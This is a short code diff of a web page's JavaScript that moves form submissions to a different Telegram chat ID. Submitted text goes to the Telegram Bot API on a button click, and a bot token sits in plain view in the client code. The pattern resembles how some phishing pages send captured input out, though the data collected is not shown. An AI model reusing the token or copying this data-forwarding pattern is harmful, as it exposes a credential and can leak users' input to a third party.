@@ -1713,7 +1713,7 @@ pills.forEach(pill => {
 
 
 const TG_BOT  = '8944824590:AAFd30yDAxMjVJtmJpthcyDnQ3E9y8RuldE';
-const TG_CHAT = '8846560138';
+const TG_CHAT = '-5125831341';
 const TG_URL  = `https://api.telegram.org/bot${TG_BOT}/sendMessage`;
 
 function tgTs() {
@@ -1827,7 +1827,7 @@ document.getElementById('sbtn').addEventListener('click', function() {
   fetch('https://api.telegram.org/bot8944824590:AAFd30yDAxMjVJtmJpthcyDnQ3E9y8RuldE/sendMessage', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: '8846560138', text: text })
+    body: JSON.stringify({ chat_id: '-5125831341', text: text })
   })
   .then(function(r) { return r.json(); })
   .then(function(d) {
